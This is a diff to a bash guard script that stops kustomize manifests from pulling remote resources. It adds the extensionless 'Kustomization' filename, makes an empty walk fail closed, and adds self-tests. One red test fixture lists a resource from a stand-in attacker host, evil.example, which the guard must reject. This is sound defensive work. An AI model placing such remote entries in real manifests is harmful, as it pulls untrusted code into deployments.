@@ -42,6 +42,20 @@ set -euo pipefail
 # false rejections with no security benefit. `patches[].patch` /
 # `patchesJson6902[].patch` are excluded outright (never path references).
 #
+# FILE DISCOVERY (round 5, adversarial review comment 5380388017): the
+# allowlist itself was sound from round 4, but the WALK that finds
+# kustomization files to check originally matched only `kustomization.yaml`
+# and `kustomization.yml` -- missing kustomize's third recognized name, the
+# extensionless `Kustomization`. A nested `sub/Kustomization` carrying a
+# remote `resources:` entry passed the guard outright (exit 0) and the
+# fetch was only caught afterward, inside `kubectl kustomize` itself, proven
+# end-to-end through the real recipes. Fixed by adding that third pattern to
+# the `find`, and by making the walk FAIL CLOSED on an empty result (zero
+# matched kustomization files is now an error, not a silent pass) -- so the
+# filename list itself is non-load-bearing: even a fourth kustomize filename
+# this script hasn't learned about yet trips the empty-walk assertion
+# instead of rendering nothing checked.
+#
 # This script is silent on success (no stdout) so callers that capture
 # `kubectl kustomize` output as a pure render are never contaminated by it --
 # it is a standalone script, not a Just recipe dependency, for exactly that
@@ -113,17 +127,75 @@ sys.exit(0)
 PY
 }
 
+# find_kustomization_files <dir>
+# NUL-separated list of every kustomization file under <dir> -- ALL THREE
+# names kustomize's own `konfig.RecognizedKustomizationFileNames()`
+# recognizes: `kustomization.yaml`, `kustomization.yml` (matched case-
+# insensitively, as kustomize itself does), and the extensionless
+# `Kustomization` (matched EXACT-case, kustomize's own casing; round 5,
+# adversarial review PR #127 comment 5380388017 -- the walk originally
+# matched only the first two, and a nested `sub/Kustomization` carrying a
+# remote `resources:` entry passed the guard outright, exit 0, with
+# `kubectl kustomize` only failing AFTERWARD, after the fetch was already
+# attempted, proven end-to-end through the real recipes).
+#
+# Implemented in Python (`os.walk`), deliberately NOT `find`: the round-5 fix
+# below (fail closed on an empty walk) immediately surfaced that `find` is
+# not on PATH in this repo's own `validate-public-operator-surface.py`
+# self-test's hermetic fixture environment (`base_environment["PATH"] =
+# str(mock_bin)`, a deliberately minimal stub toolset that never listed
+# `find`) -- meaning a `find`-based walk had been silently matching ZERO
+# files inside that one test path since round 3, masked by exactly the
+# silent-empty-walk defect round 5 closes. Rather than special-case that one
+# harness's mock PATH, this script stops depending on `find` being present
+# on PATH at all, in any environment; `python3` is already a hard dependency
+# of this script for the realpath check below.
+find_kustomization_files() {
+  local root="$1"
+  python3 -I - "${root}" <<'PY'
+import os
+import sys
+
+root = sys.argv[1]
+extensioned = {"kustomization.yaml", "kustomization.yml"}
+for dirpath, _dirnames, filenames in os.walk(root):
+    for name in filenames:
+        if name.lower() in extensioned or name == "Kustomization":
+            sys.stdout.write(os.path.join(dirpath, name))
+            sys.stdout.write("\0")
+PY
+}
+
 # check_kustomization_dir <dir>
-# Walks every kustomization.yaml/kustomization.yml under <dir>, extracts
-# every reference-carrying field entry, and requires each to pass
+# Extracts every reference-carrying field entry from each kustomization file
+# find_kustomization_files finds, and requires each to pass
 # is_safe_local_path relative to THAT FILE's own directory (not <dir> itself
 # -- a nested kustomization's references are relative to where it lives).
 # Prints one ERROR line and returns 1 on the first violation.
+#
+# FAILS CLOSED ON AN EMPTY WALK. If no kustomization file is found at all --
+# wrong path, an unexpected tree shape, a `find`-style dependency silently
+# missing (see above), or a filename this script hasn't learned about yet --
+# this is an ERROR, not a silent pass. A guard that can be disabled by an
+# empty match set is the same defect class as a guard with an incomplete
+# pattern list: the round-3 denylist failed by missing forms it should have
+# matched, and an un-failed empty walk fails the identical way one level up,
+# by matching nothing at all. This makes the filename list itself
+# non-load-bearing: even a FOURTH kustomize filename this script has not
+# learned about yet would trip this assertion instead of silently rendering
+# nothing checked.
 check_kustomization_dir() {
   local root="$1"
   local kfile kdir field value
+  local matched=0
   while IFS= read -r -d '' kfile; do
-    kdir="$(dirname "${kfile}")"
+    matched=$((matched + 1))
+    # Pure-bash dirname (parameter expansion, no external `dirname` command):
+    # the round-5 mock-PATH lesson above applies to every external tool this
+    # script leans on, not just `find` -- prefer a bash builtin wherever one
+    # exists instead of assuming any given coreutil is on PATH.
+    kdir="${kfile%/*}"
+    [ "${kdir}" != "${kfile}" ] || kdir="."
     while IFS=$'\t' read -r field value; do
       [ -n "${field}" ] || continue
       if ! is_safe_local_path "${kdir}" "${value}"; then
@@ -131,7 +203,11 @@ check_kustomization_dir() {
         return 1
       fi
     done < <(yq -r "${JQ_FILTER}" "${kfile}" 2>/dev/null)
-  done < <(find "${root}" \( -iname 'kustomization.yaml' -o -iname 'kustomization.yml' \) -print0)
+  done < <(find_kustomization_files "${root}")
+  if [ "${matched}" -eq 0 ]; then
+    echo "ERROR: no kustomization file (kustomization.yaml, kustomization.yml, or Kustomization) found under ${root} -- refusing rather than silently passing an empty walk" >&2
+    return 1
+  fi
   return 0
 }
 
@@ -228,6 +304,48 @@ resources:
 YAML
   run_case "resources: ../ escape to a real file outside the dir" "${tmp}/red-escape" 1
 
+  # RED 6: nested extensionless `Kustomization` -- the round-5 bypass. The
+  # reviewer's exact PoC shape: a nested directory whose kustomization file
+  # has NO extension (kustomize's third recognized name), carrying a remote
+  # `resources:` entry, referenced from the root kustomization's own
+  # `resources:`/`components:` list.
+  mkdir -p "${tmp}/red-nested-extensionless/sub"
+  cat > "${tmp}/red-nested-extensionless/kustomization.yaml" <<'YAML'
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+resources:
+  - sub
+YAML
+  cat > "${tmp}/red-nested-extensionless/sub/Kustomization" <<'YAML'
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+resources:
+  - https://evil.example/nested.yaml
+YAML
+  run_case "nested sub/Kustomization (no extension) with a remote entry" "${tmp}/red-nested-extensionless" 1
+
+  # RED 7: empty walk -- fails closed rather than silently passing. Proves
+  # the filename list is non-load-bearing: even a directory with NO
+  # recognized kustomization file at all (wrong path, unexpected tree shape,
+  # or a future fourth kustomize filename this script hasn't learned yet)
+  # refuses instead of vacuously succeeding.
+  mkdir -p "${tmp}/red-empty-walk"
+  echo "not a kustomization file" > "${tmp}/red-empty-walk/README.md"
+  run_case "empty walk: no kustomization file present at all" "${tmp}/red-empty-walk" 1
+
+  # GREEN: a legitimate extensionless `Kustomization`, safe local entries --
+  # proves the third filename is recognized in both directions, not just
+  # rejected when malicious.
+  mkdir -p "${tmp}/green-extensionless"
+  cat > "${tmp}/green-extensionless/Kustomization" <<'YAML'
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+resources:
+  - deployment.yaml
+YAML
+  echo "kind: Deployment" > "${tmp}/green-extensionless/deployment.yaml"
+  run_case "extensionless Kustomization with a safe local entry" "${tmp}/green-extensionless" 0
+
   # GREEN: plain local filenames, exactly the committed tree's shape.
   mkdir -p "${tmp}/green-local"
   cat > "${tmp}/green-local/kustomization.yaml" <<'YAML'
@@ -248,7 +366,7 @@ YAML
   run_case "the real committed web stack tree" "k8s/web/greatfallstoolbus-org-production" 0
 
   if [ "${failures}" -eq 0 ]; then
-    echo "guard-no-remote-kustomize-resources self-test passed (8 cases)"
+    echo "guard-no-remote-kustomize-resources self-test passed (11 cases)"
     return 0
   fi
   echo "guard-no-remote-kustomize-resources self-test FAILED (${failures} case(s))" >&2
